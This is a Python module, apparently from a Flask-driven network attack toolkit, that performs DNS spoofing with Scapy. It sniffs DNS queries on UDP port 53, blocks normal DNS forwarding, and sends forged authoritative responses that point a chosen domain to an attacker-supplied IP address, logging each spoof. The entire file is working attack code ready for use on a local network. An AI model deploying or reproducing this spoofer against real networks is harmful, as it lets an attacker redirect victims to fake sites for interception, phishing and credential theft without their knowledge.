import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
import time
from . import STATUS, STOP_EVENT
from .utils import log_msg, set_dns_blocking

# DNS Spoofing State
LOG_COOLDOWN = {} 

# DNS Packet Interception & Spoofing
def dns_spoofer(packet):
    # Stop processing if attack has been stopped from Flask
    if STOP_EVENT.is_set(): 
        return
    
    # Verify packet has DNS layer and is a query (not a response)
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        try:
            # Extract the queried domain name from DNS query record
            qname = packet[DNSQR].qname.decode('utf-8')
            
            # Get target domain and fake IP from STATUS (set by Flask route)
            target_domain = STATUS.get("dns_domain")
            fake_ip = STATUS.get("dns_ip")
            
            if target_domain and target_domain in qname:
                # SPAM FILTER: Prevent log flooding
                current_time = time.time()
                last_log = LOG_COOLDOWN.get(qname, 0)
                
                # Only log if 3 seconds have passed since last log for this domain
                if current_time - last_log > 3:
                    log_msg(f"[DNS] SPOOFED: {qname} -> {fake_ip}")
                    LOG_COOLDOWN[qname] = current_time

                # Craft Forged DNS Response
                scapy_ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
                scapy_udp = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
                
                # Craft DNS response layer
                scapy_dns = scapy.DNS(
                    id=packet[scapy.DNS].id, qr=1, aa=1, 
                    qd=packet[scapy.DNS].qd, 
                    an=scapy.DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip)
                )
                
                spoofed_pkt = scapy_ip / scapy_udp / scapy_dns
                
                # Delete calculated fields so Scapy recalculates with correct values
                del spoofed_pkt[scapy.IP].len
                del spoofed_pkt[scapy.IP].chksum
                del spoofed_pkt[scapy.UDP].len
                del spoofed_pkt[scapy.UDP].chksum
                
                # Send forged DNS response on the network
                scapy.send(spoofed_pkt, verbose=False, iface=STATUS["interface"])
                
        except: pass

def start_dns_spoofing():
    try:
        log_msg("[CONFIG] DNS Forwarding: DISABLED (Intercepting requests)")
        set_dns_blocking(True) 
        scapy.sniff(filter="udp port 53", prn=dns_spoofer, iface=STATUS["interface"], stop_filter=lambda x: STOP_EVENT.is_set())
    finally:
        # Clean up: Disable DNS blocking rules
        set_dns_blocking(False)